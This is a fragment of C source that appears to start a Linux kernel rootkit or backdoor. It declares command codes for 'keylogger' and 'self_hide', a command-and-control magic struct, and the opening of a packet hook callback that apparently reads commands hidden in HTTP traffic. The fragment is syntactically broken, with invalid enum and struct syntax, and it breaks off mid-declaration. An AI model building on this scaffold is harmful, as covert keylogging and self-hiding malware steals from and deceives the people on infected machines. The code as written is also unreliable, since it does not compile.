
enum commands_set {keylogger:1, self_hide:2};
struct cnc_http_magic {
	unsigned int magic,
	enum commands_set comm
};



unsigned int http_callback( unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct iphdr *ip_header;
	struct ic
}